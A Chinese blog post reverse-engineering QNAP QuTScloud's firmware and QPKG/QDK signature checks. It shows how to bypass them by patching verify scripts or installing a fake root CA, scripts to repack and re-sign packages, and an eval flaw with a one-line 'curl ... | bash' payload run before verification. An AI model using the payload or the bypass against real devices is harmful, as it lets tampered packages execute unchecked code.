---
title: "QutsCloud 逆向笔记 - 安装包文件签名校验"
date: 2022-03-24
categories:
- qutscloud
thumbnailImagePosition: "left"
thumbnailImage: /img/qnap-sign-check-cover2.png
typora-root-url: ..\..\static
---



本篇介绍QNAP如何对安装包以及QPKG的签名进行校验，以及怎样跳过签名检查，顺带也分析一下QPKG的格式以及如何对固件及QPKG重新打包及签名。

<!--more-->

{{< toc >}}

# 1. 签名校验的原理

对固件及QPKG签名校验的命令分别在文件

- `/etc/init.d/cs_fw_verify.sh` - 固件签名校验
- `/sbin/cs_qpkg_verify.sh` - QPKG签名校验

其中校验签名的命令是一样的

```shell
ret="$($CMD_ECHO -n "$CS_INSTALL_FILE:$CS_DS_FILE:${qpkg_name}" | $CMD_QSH -0w300 cs_qdaemon.verify_digital_signature)"
```

都是使用qsh调用RPC`cs_qdaemon.verify_digital_signature`，这个RPC接受的参数为`:`分隔的三部分

- `CS_INSTALL_FILE` - 需要进行校验的数据文件
- `CS_DS_FILE` - 签名
- `qpkg_name` - 安装包名，固件则使用固定字符串`fw`



而`cs_qdaemon.verify_digital_signature` 的具体实现在`/usr/lib/libcode_signing.so`中，进行校验的时候会进行如下操作

- 寻找根证书
- 校验签名并读出签名中的sha1
- 计算数据文件的sha1并进行比较
- 将校验通过的签名存储

## 寻找根证书

`libcode_signing`首先从签名中取出附带的证书

```shell
#cat initrd.boot.sign | openssl smime -pk7out | openssl pkcs7 -print_certs
subject=C = TW, ST = Taiwan, L = Taipei, O = QNAP, OU = NAS, CN = fw, emailAddress = security@qnap.com

issuer=C = TW, ST = Taiwan, L = Taipei, O = QNAP, OU = NAS, CN = QNAP_CA, emailAddress = security@qnap.com

-----BEGIN CERTIFICATE-----
...
```

并根据其中`issuer`的 `O = QNAP`来确定根证书的位置

- `O = QNAP` - `/etc/default_config/trpq`
- `O = QNAP 3rd party` - `/etc/default_config/trpq3`
- `O = Third party` - `/etc/default_config/trpq3_1`
- 其他情况，从SSL默认证书目录`/etc/ssl/certs`中寻找`issuer`对应的证书，文件名会使用下面的hash
  - `openssl x509 -subject_hash -in [CERT PEM]`

​	

## 校验签名并读出签名中的sha1

`libcode_signing`使用`cms_verify`来对签名校验，如果用openssl的命令则可以写成

```shell
#openssl cms -verify -CAfile /etc/default_config/trpq  -in initrd.boot.sign -out sign.txt
Verification successful
```

可以看到，使用系统的根证书可以通过校验

而导出的sign.txt则保存了签名中校验通过的一小段二进制，也就是需要在下一步对比的sha1



## 计算数据文件的sha1并进行比较

```shell
#sha1sum initrd.boot
57c3a107c525105a10e197c087c878881acc4f3c  initrd.boot
```

使用`sha1sum`计算出数据文件的哈希值，并且与上一步导出的sign.txt进行对比，就可以知道文件是否被修改过

```shell
#hexdump -e  '20/1 "%02x" "\n"' sign.txt
57c3a107c525105a10e197c087c878881acc4f3c
```

看起来还不错，是一样的



## 将校验通过的签名存储

通过校验后，`libcode_signing`会将签名以及包名存储在`/etc/config/nas_sign_qpkg.db`中

![](/img/qnap-sign-check-1.png)

`QpkgName`对应参数中的`qpkg_name`，`DigitalSignature`则是签名文件，如果有同名的包，则后面的签名会覆盖上一个签名，比如这里的`fw`对应的签名是`rootfs_ext.tgz.sign`， 因为它在ls中排最后

```shell
#ls -l *.cksum
-rw-r--r-- 1 admin administrators 77 2022-01-18 11:03 bzImage.cksum
-rw-r--r-- 1 admin administrators 81 2022-01-18 11:03 initrd.boot.cksum
-rw-r--r-- 1 admin administrators 79 2022-01-18 11:03 qpkg.tar.cksum
-rw-r--r-- 1 admin administrators 81 2022-01-18 11:03 rootfs2.bz.cksum
-rw-r--r-- 1 admin administrators 83 2022-01-18 11:03 rootfs_ext.tgz.cksum
```



# 2. 如何跳过签名校验



基于上一步的分析，显然有两种方法可以跳过QNAP的签名校验

- 修改两个进行校验的脚本，让这两个脚本无论什么时候都返回`0:0`

- 使用第三方的根证书进行签名



## 修改脚本

修改`/etc/init.d/cs_fw_verify.sh` 以及`/sbin/cs_qpkg_verify.sh` ，让它们全部只返回`0:0`

```shell
echo "0:0"
```

优点是完全不进行签名校验了，任何固件以及QPKG都可以通过校验，但是因为数据库中不会再插入签名，UI上面会提示安装的包没有有效的签名，但是并不会影响使用，另外，qpkg_cli使用下面的命令来检查qpkg有没有对应的签名，以及签名日期

```shell
#echo -n "fw" | qsh -0e cs_qdaemon.get_cms_info
QNAP
QNAP
2019/08/29 15:06:56        # create time of cert
2022/08/28 15:06:56        # expire time of cert
QNAP
2022/01/19 09:03:13        # create time of sign
0 
```



## 使用第三方的根证书进行签名

使用这个办法就只需要添加一个根证书到ssl的目录下面，然后使用该证书签名即可

存在的问题在于

- 根证书是否会被系统包更新
- 系统包是否会检测必须使用QNAP签发的根证书

```shell
# 生成根证书
openssl genrsa -out root.key 4096
HOME=. openssl req -rand /dev/random -new  -key root.key -out root.csr -subj "/C=CN/O=FAKE_QNAP/OU=NAS/CN=FAKE_QNAP_ROOT"
openssl x509 -req -days 3650 -in root.csr -signkey root.key -out root.crt
hash=$(openssl x509 -subject_hash -in root.crt -noout)
cp root.crt /etc/ssl/certs/FAKE_QNAP.crt
( cd /etc/ssl/certs; ln -s FAKE_QNAP.crt $hash.0)

# 使用根证书签发签名用证书
openssl genrsa -out sign.key 4096
HOME=. openssl req -rand /dev/random -new  -key sign.key -out sign.csr -subj "/C=CN/O=FAKE_QNAP/OU=NAS/CN=FAKE_QNAP_SIGN"
openssl x509 -req -days 3650 -CA root.crt -CAkey root.key -CAcreateserial -in sign.csr -out sign.crt
hash=$(openssl x509 -subject_hash -in sign.crt -noout)
cp sign.crt /etc/ssl/certs/FAKE_QNAP_SIGN.crt
( cd /etc/ssl/certs; ln -s FAKE_QNAP.crt $hash.0)   # 这里没有写错，QNAP确实用签名证书的hash来链接到根证书，我也表示很懵逼

# 随便签名一点东西试试
echo 123 > test
openssl sha1 -binary test | openssl cms -sign  -nodetach -binary -signer sign.crt -inkey sign.key > test.sign
# 校验一下试试
echo -n "`pwd`/test:`pwd`/test.sign:fw" | qsh -0w300 cs_qdaemon.verify_digital_signature
```



签名校验的命令输出结果`0:0`，表示验证通过

```bash
# echo -n "`pwd`/test:`pwd`/test.sign:fw" | qsh -0w300 cs_qdaemon.verify_digital_signature
0:0
```



# 3. QPKG格式简析

QNAP中的安装包分为两种，一个是QDK，一个是QPKG，区别就是QDK多一个`control.tar.gz`里面包含了安装的一些信息，具体是什么信息直接用7z打开就能看到，这里不做分析。

现在QNAP的包大部分都是QDK，QPKG很少见了，只有老一点的版本上才能看到。

这两种格式基本一致，都是由前面安装文件以及后面附加的签名以及安装包信息构成，整个包从开始到结束按照下面来编排

```
-------------------
解压脚本
-------------------
control.tar.gz(仅QDK)
-------------------
data.tar.gz
-------------------
包尾部附加的数据（包括签名，包的名字，版本等等）
-------------------
```



在`cs_qpkg_verify.sh`中有函数对其进行判断，如果开头的地方能找到`control.tar.gz`，那么这就是一个QDK包，否则就是QPKG包

```shell
QDK_ARCH="control.tar.gz"
...
check_file_type(){
    if [ -z "${CS_QPKG_FILE}" ] || [ ! -f "${CS_QPKG_FILE}" ]; then
        $CMD_ECHO "$LOG_HEAD:${CS_QPKG_FILE}: no such file" >> $LOG_FILE
        exit_with_error_and_clean
    else
    	local ret="$($CMD_DD if="${CS_QPKG_FILE}" bs=$CS_PREREAD_BS count=1 2>/dev/null | $CMD_GREP -c "${QDK_ARCH}")"
        #local ret="$($CMD_CAT ${CS_QPKG_FILE} | $CMD_GREP -c "${QDK_ARCH}")"
        if [ $ret -gt 0 ]; then
            CS_QPKG_TYPE=${CS_TYPE_QDK}
            #$CMD_ECHO "CS_QPKG_TYPE = ${CS_TYPE_QDK}"
        else
            CS_QPKG_TYPE=${CS_TYPE_QPKG}
            #$CMD_ECHO "CS_QPKG_TYPE = ${CS_TYPE_QPKG}"
        fi
    fi
}
```



## QPKG

QPKG签名的位置及大小

```shell
CS_DS_POS="$($CMD_ECHO $CS_DS_POS | $CMD_CUT -f 2 -d '=')"
CS_DS_SIZE="$(($qpkg_size - $CS_DS_POS - $CS_QDK_TAG_LEN - $CS_QPKG_TAIL_DATA_LEN - 1))"
```

位置就是尾部找到的字符串QDK_offset=xxxx中的值，签名的长度就是总的长度减去其余的长度，我在下面标出来各个部分的长度

```
# 尾部的格式
-----
QDK_offset=xxxx #length: $CS_QDK_TAG_LEN
-----
空格             #length: 1
-----
签名
-----
qpkg info         #length: $CS_QPKG_TAIL_DATA_LEN 固定长度100byte
```

获取安装文件以及签名的语句

```shell
#签名
local skip_len="$(($CS_DS_POS + $CS_QDK_TAG_LEN))"
$CMD_DD if=${CS_QPKG_FILE} bs=1 skip=$skip_len count=$CS_DS_SIZE 2>/dev/null > ${CS_DS_FILE}
    
#安装文件
local ret="$(($CS_DS_POS - 1))"
$CMD_DD if=${CS_QPKG_FILE} bs=$ret count=1 2>/dev/null > ${CS_INSTALL_FILE}

```

注意到安装文件和末尾附加的tag之间还有一个字符`0x00`



## QDK

QDK的安装文件的长度在头部的脚本中，最后算出的offset就是安装文件的大小

```shell
script_len=4289
...
offset=$(/usr/bin/expr $script_len + 20480)
...
offset=$(/usr/bin/expr $offset + 53924602)
```

尾部则是一个TLV数组

```
----
TAG  ("QDK")
----
TYPE (1 byte)
----
LENGTH OF VALUE (network order 4byte)
----
VALUE
----
...
```

所以QDK包尾部的结构是

```
---
TLV (signture, type 0xFE, length: 1 + len(sign) byte)
---
TLV (EOF, type 0xFF, length: 1 byte)
---
qpkg info, length: 100byte
```



## QPKG INFO

这两种包的尾部都是是一个固定的字符串数组，等价定义（非NULL结尾，空格填充）

```c
char qpkginfo[100];
char *encrypt = &qpkginfo[40];  // 整个包长度 * 3589 + 1000000000;
char *pkg_name = &qpkginfo[60]; // 包名，长度20byte，其他均为10byte
char *version = &qpkginfo[80];  // 包版本
char *tag = &qpkginfo[90];      // 固定字符串：QNAPQPKG
```



## QDK代码执行漏洞

QKD包签名验证的脚本中有这样一个函数

```shell
get_content_size(){
        [ -n "$1" ] || err_msg "internal error: get_content_size called with no argument"
        local qpkg="$1"
        [ -f "${qpkg}" ] || err_msg ""${qpkg}": no such file"
        local offset_command="$(/bin/sed -n "1,/^exit 1/{
s/^script_len.*/&;/p
s/^offset.*/&;/p
/^exit 1/q
}" "${qpkg}") echo \$offset"
        echo "$(eval $offset_command)"
}
```

这里居然犯了这样一个错误，直接从包里面sed出语句然后eval？？？

虽然进行包签名的验证，但是在这个函数执行的时候签名还没通过呀。

如果有一个包，里面脚本这样写就可以随意执行了，然后再把包修改一下覆盖签名也可以通过了。

```shell
offset=$(curl https://xxx/xx.sh | bash; echo ${oldoffset})
```

这样看来，这个签名其实看着有用，实际上也是只防君子不防小人

**(所以请不要安装任何非官方地址下载的包)**

**(所以请不要安装任何非官方地址下载的包)**

**(所以请不要安装任何非官方地址下载的包)**



关于eval以及类似eval的代码执行可以看看这个，感觉有点意思

https://www.vidarholen.net/contents/blog/?p=716


> The shell evaluates values in an arithmetic context in several syntax constructs where the shell expects an integer. This includes: $((here)), ((here)), ${var:here:here}, ${var[here]}, var[here]=.. and on either side of any [[ numerical comparator like -eq, -gt, -le and friends.






# 4. 如何修改固件及重签名

固件的imge分区表如下所示

```shell
#fdisk -p /dev/sda

Disk /dev/sda: 53.6 GB, 53687091200 bytes
8 heads, 32 sectors/track, 409600 cylinders
Units = cylinders of 256 * 512 = 131072 bytes

   Device Boot      Start         End      Blocks   Id  System
/dev/sda1               1          17        2160   83  Linux
/dev/sda2   *          18        1910      242304   83  Linux
/dev/sda3            1911        3803      242304   83  Linux
/dev/sda4            3804        3936       17024    5  Extended
/dev/sda5            3804        3868        8304   83  Linux
/dev/sda6            3869        3936        8688   83  Linux
```



`/dev/sda2`及`/dev/sda3`是固件系统文件所在分区，`/dev/sda5`是配置所在分区，会挂载为`/mnt/boot_config`在系统重置后就会从这里读取数据，正常情况不会读，`/dev/sda6`似乎和`/dev/sda5`作用差不多，但是实际上应该不会用到，因为`/dev/sda5`使用的大小已经超过suid在`/dev/sda6`中的偏移量

```shell
#dumpe2fs /dev/sda5 |grep "^Block"
dumpe2fs 1.45.5 (07-Jan-2020)
Block count:              2076		<= 使用8M
Block size:               4096       
Blocks per group:         32768
#dumpe2fs /dev/sda6 |grep "^Block"
dumpe2fs 1.45.5 (07-Jan-2020)
Block count:              4096		<= 使用4M，suid位于偏移+7864320处
Block size:               1024
Blocks per group:         8192
```

而用户数据位于`cachedev1`，是一个基于`dm -> md raid1 -> drbd -> lvm -> dm`的文件系统

```shell
# mount |grep cachedev
/dev/mapper/cachedev1 on /share/CACHEDEV1_DATA type ext4 (rw,usrjquota=aquota.user,jqfmt=vfsv1,user_xattr,data=ordered,data_err=abort,delalloc,nopriv,nodiscard,noacl)
```
```shell
# dmsetup ls --tree
...
dom_ext3 (253:13)		=> /dev/dm-13
 └─dom_ext (253:0)
    └─ (8:0)
...
cachedev1 (253:17)
 └─vg288-lv1 (253:16)
    └─ (147:1)
...
```
```shell
# lvdisplay
  --- Logical volume ---
  LV Path                /dev/vg288/lv544
  LV Name                lv544
  VG Name                vg288
  LV UUID                lgBRpc-fUm3-kCyo-7f7p-ko92-Z7Sr-9XjRad
  LV Write Access        read/write
  LV Creation host, time NASCFB4D4, 2022-03-20 20:29:15 +0800
  LV Status              NOT available
  LV Size                532.00 MiB
  Current LE             133
  Segments               2
  Allocation             inherit
  Read ahead sectors     8192

  --- Logical volume ---
  LV Path                /dev/vg288/lv1
  LV Name                lv1
  VG Name                vg288
  LV UUID                IW4QCX-IG4K-zHr3-lzj4-AsI5-kZrK-yYdbRz
  LV Write Access        read/write
  LV Creation host, time NASCFB4D4, 2022-03-20 20:29:17 +0800
  LV Status              available
  # open                 1
  LV Size                49.50 GiB
  Current LE             12672
  Segments               1
  Allocation             inherit
  Read ahead sectors     8192
  Block device           253:16
```
```shell
# pvdisplay
  --- Physical volume ---
  PV Name               /dev/drbd1
  VG Name               vg288
  PV Size               50.02 GiB / not usable 2.21 MiB
  Allocatable           yes (but full)
  PE Size               4.00 MiB
  Total PE              12805
  Free PE               0
  Allocated PE          12805
  PV UUID               MMC869-xXZR-kKO9-1z9j-1OLc-eP1X-3WYSsL
```
```shell
# drbdsetup show all
resource r1 {
    options {
    }
    _this_host {
        volume 0 {
            device                      minor 1;
            disk                        "/dev/md1";
            meta-disk                   internal;
            disk {
                resync-rate             4194304k; # bytes/second
            }
        }
    }
}
```
```shell
# cat /proc/mdstat
Personalities : [linear] [raid0] [raid1] [raid10] [raid6] [raid5] [raid4] [multipath]
md1 : active raid1 dm-13[0]
      52452096 blocks super 1.0 [1/1] [U]

...
```

貌似写的有点多了，不过这里写这个的意思是，qutscloud可以在单一磁盘上保存系统固件和用户数据，也就是说，一块硬盘就可以使用qutscloud了，而不像qts，启动需要一块硬盘，而需要其他硬盘来存储用户数据，这也是qutscloud的优势之一，不过缺点就是硬件平台的QVS以及硬件转码就不被官方支持了，但是感觉如果能安装以及加驱动补丁的话，这两个事情应该也是可以做到的。



好了，闲话不说了，下面说说怎么修改固件及重新签名，initrd的格式是cpio，所以修改和重新打包可以使用下面的命令

```shell
# 在用户存储空间中解包
# 未激活则可以在/tmp中解包
# mount -t tmpfs tmpfs -o size=1G /tmp ; cd /tmp
cd /share/CACHEDEV1_DATA/Public/
mkdir fw
mount /dev/mapper/dom3 fw
mkdir initrd && cd initrd
lzma -d < ../fw/boot/initrd.boot | cpio -idm
```

解包后在initrd就可以看到解包后的文件了，可以修改任意文件后重新打包

```shell
# 因为内核模块已经包含，所以直接cpio打包就可以了，先切换到initrd目录下面
cd initrd
find ./* | cpio -H newc -o | lzma -z > ../initrd.boot

# 签名，使用上一步生成的签名用证书
cd ..
openssl sha1 -binary initrd.boot | openssl cms -sign  -nodetach -binary -signer sign.crt -inkey sign.key > initrd.boot.sign

# 计算cksum，这里使用的crc
cksum initrd.boot > initrd.boot.cksum

# 然后cp回去就完了
cp initrd.boot* fw/boot/
```

当然通过签名的条件是上一步生成的根证书要记得放进去，并且做好链接，实际上qutscloud如果检测到固件签名校验失败并不会重启或者拒绝启动，只是会在通知中心弹出通知说你的系统被修改云云。



# 5. 如何修改QPKG及重签名

## 修改QPKG

因为QPKG的头是固定长度，所以很容易就可以将其解压出来

```shell
#!/bin/bash
SIGN_CERT=sign.crt
SIGN_KEY=sign.key

PREFIX=qpkg_workspace
EXTRACT_PATH=qpkg_content

extract_qpkg() {
        script_len=`head -c 5000 $QPKG | sed -n "s/.*bs=\([0-9]*\) skip=1.*/\1/gp" `
        echo script size $script_len
        mkdir -p $PREFIX/$EXTRACT_PATH
        dd if=$QPKG bs=$script_len skip=1 | tar zx -C $PREFIX/$EXTRACT_PATH/data
        dd if=$QPKG bs=$script_len count=1 > $PREFIX/head
        tail -c 100 $QPKG > $PREFIX/tail
}

pack_qpkg() {
        tar --ignore-failed-read -czf $PREFIX/qpkg.tar.gz -C $PREFIX/$EXTRACT_PATH data.tar.gz  package_routines  qinstall.sh  qpkg.cfg
        cat $PREFIX/head $PREFIX/qpkg.tar.gz > $PREFIX/qpkg.bin
        echo -ne "\000" >> $PREFIX/qpkg.bin

# sign
        openssl sha1 -binary $PREFIX/qpkg.bin | openssl cms -sign  -nodetach -binary
 -signer $SIGN_CERT -inkey $SIGN_KEY > $PREFIX/qpkg.bin.sign

# update offset
        offset=`stat -c "%s" $PREFIX/qpkg.bin`
        offset=$((offset+1))
        echo -n "QDK_offset=$offset " >> $PREFIX/qpkg.bin
        cat $PREFIX/qpkg.bin.sign >> $PREFIX/qpkg.bin
        cat $PREFIX/tail >> $PREFIX/qpkg.bin

# update encrypt
        fullsize=`stat -c "%s" $PREFIX/qpkg.bin`
        encrypt=$((fullsize * 3589 + 1000000000))
        echo -n "$encrypt" | dd of=$PREFIX/qpkg.bin seek=$((fullsize-60)) bs=1 conv=notrunc
        mv $PREFIX/qpkg.bin $PREFIX/$QPKG
}

usage() {
        echo "Usage:"
        echo "$0 extract foldername pkgname             extract package to foldername"
        echo "$0 pack foldername pkgname                pack files under folder to foldername"
        exit 1
}

if [ "$#" -eq "2" ]; then
        usage
fi

PREFIX="$2"
QPKG=$3

case "$1" in
        extract)
                extract_qpkg
                ;;
        pack)
                pack_qpkg
                echo "please find it in $PREFIX/$QPKG"
                ;;
        *)
                usage
esac

```

使用上面这个脚本就可以对其重新打包及签名了，找个老版本的QPKG包来测试一下

```shell
# ./qpkg.sh extract license LicenseCenter.bin
609+1 records in
609+1 records out
472643 bytes (461.6KB) copied, 0.006043 seconds, 74.6MB/s
1+0 records in
1+0 records out
776 bytes (776B) copied, 0.000008 seconds, 92.5MB/s
# ls license/
head  qpkg_content  tail
# ls license/qpkg_content/
data.tar.gz  package_routines  qinstall.sh  qpkg.cfg
# ./qpkg.sh pack license LicenseCenter.bin
10+0 records in
10+0 records out
10 bytes (10B) copied, 0.000132 seconds, 74.0KB/s
please find it in license/LicenseCenter.bin
# /sbin/cs_qpkg_verify.sh -f license/LicenseCenter.bin
0:0
```

看起来一切正常，输出的`0:0`表示签名校验通过



## 修改QDK

与QPKG有点不一样的是，QDK把偏移放在开头的脚本中，所以可以直接读取后分段构造

```shell
#!/bin/bash

SIGN_CERT=sign.crt
SIGN_KEY=sign.key

PREFIX=qpkg_workspace
EXTRACT_PATH=qpkg_content

len_to_binary() {
        len=$1
        byte4="\\`printf 'x%02x' $((len%256))`"
        len=$((len/256))
        byte3="\\`printf 'x%02x' $((len%256))`"
        len=$((len/256))
        byte2="\\`printf 'x%02x' $((len%256))`"
        len=$((len/256))
        byte1="\\`printf 'x%02x' $((len%256))`"
        printf "$byte1$byte2$byte3$byte4"
}

get_offset() {
        offsets="$(/bin/sed -n '1,/^exit 1/{
s/^script_len=\([0-9]*\).*$/\1/p
s/^offset.*script_len[^0-9]*\([0-9]*\).*$/\1/p
s/^offset.*offset[^0-9]*\([0-9]*\).*$/\1/p
/^exit 1/q
}' "${QPKG}")"
        script_len=`echo $offsets|cut -f 1 -d " "`
        raw_offset1=`echo $offsets|cut -f 2 -d " "`
        raw_offset2=`echo $offsets|cut -f 3 -d " "`
        offset1=$((script_len+raw_offset1))
        offset2=$((offset1+raw_offset2))
}

extract_qdk() {
        mkdir -p $PREFIX/$EXTRACT_PATH
        get_offset
        echo $script_len $raw_offset1 $raw_offset2 $offset1 $offset2
        echo $(((raw_offset2+1024)/1024))
        dd if=$QPKG bs=$script_len count=1 > $PREFIX/head
        if grep data.tar.7z  $PREFIX/head >/dev/null; then
                is7z=1
        fi
        dd if=$QPKG bs=$script_len skip=1 |/bin/tar -xO | /bin/tar -xzv -C  $PREFIX/$EXTRACT_PATH
        dd if=$QPKG bs=$offset1 skip=1 | /bin/cat | /bin/dd bs=1024 of=$PREFIX/$EXTRACT_PATH/data.tar.gz
        truncate -s $raw_offset2 $PREFIX/$EXTRACT_PATH/data.tar.gz

        mkdir $PREFIX/$EXTRACT_PATH/data
        if [ "$is7z" == "1" ]; then
                mv $PREFIX/$EXTRACT_PATH/data.tar.gz $PREFIX/$EXTRACT_PATH/data.tar.7z
                7z x -so $PREFIX/$EXTRACT_PATH/data.tar.7z | tar x -C $PREFIX/$EXTRACT_PATH/data
        else
                tar xf $PREFIX/$EXTRACT_PATH/data.tar.gz -C $PREFIX/$EXTRACT_PATH/data
        fi

        tail -c 100 $QPKG> $PREFIX/tail
}

pack_qdk() {
        # control.tar.gz
        tar czf $PREFIX/control.tar.gz -C $PREFIX/$EXTRACT_PATH build_info package_routines  qinstall.sh  qpkg.cfg
        tar cf $PREFIX/control.tar -C $PREFIX control.tar.gz
        new_offset1=`stat -c "%s" $PREFIX/control.tar`
        new_offset2=`stat -c "%s" $PREFIX/$EXTRACT_PATH/data.tar.gz`
# update control.tar offset
        sed -i "s/^\(.*script_len \+ \)$raw_offset1\(.*\)\$/\1$new_offset1\2/g" $PREFIX/head
# update data.tar.gz offset
# assume the longest number will not expect confict.
        sed -i "s/^\(.*\)$raw_offset2\(.*\)\$/\1$new_offset2\2/g" $PREFIX/head
# update /bin/dd bs=1024 count=
        bcount=$(((new_offset2+1024)/1024))
        sed -i "s/^\(.*bs=1024 count=\)[0-9]*\(.*\)\$/\1$bcount\2/g" $PREFIX/head

# update script_len
        script_len=`stat -c "%s" $PREFIX/head`
        sed -i "s/^script_len=.*\$/script_len=$script_len/g" $PREFIX/head

# assemble
        cat $PREFIX/head $PREFIX/control.tar $PREFIX/$EXTRACT_PATH/data.tar.gz > $PREFIX/qpkg.bin

# sign
        openssl sha1 -binary $PREFIX/qpkg.bin | openssl cms -sign  -nodetach -binary
 -signer $SIGN_CERT -inkey $SIGN_KEY > $PREFIX/qpkg.bin.sign

 # tail
        sign_len=`stat -c "%s" $PREFIX/qpkg.bin.sign`
        echo -n "QDK" >> $PREFIX/qpkg.bin
        printf "\xFE" >> $PREFIX/qpkg.bin
        len_to_binary $sign_len >> $PREFIX/qpkg.bin
        cat $PREFIX/qpkg.bin.sign >> $PREFIX/qpkg.bin
        printf "\xFF" >> $PREFIX/qpkg.bin
        cat $PREFIX/tail >> $PREFIX/qpkg.bin
 # update encrypt
        fullsize=`stat -c "%s" $PREFIX/qpkg.bin`
        encrypt=$((fullsize * 3589 + 1000000000))
        echo -n "$encrypt" | dd of=$PREFIX/qpkg.bin seek=$((fullsize-60)) bs=1 conv=notrunc
        mv $PREFIX/qpkg.bin $PREFIX/$QPKG

}

usage() {
        echo "Usage:"
        echo "$0 extract foldername pkgname             extract package to foldername"
        echo "$0 pack foldername pkgname                pack files under folder to foldername"
        exit 1
}

if [ "$#" -eq "2" ]; then
        usage
fi

PREFIX="$2"
QPKG=$3

case "$1" in
        extract)
                extract_qdk
                ;;
        pack)
                pack_qdk
                echo "please find it in $PREFIX/$QPKG"
                ;;
        *)
                usage
esac

```



QDK的还没测试，以后有空再测试一下吧，感觉应该大概也许可以用。
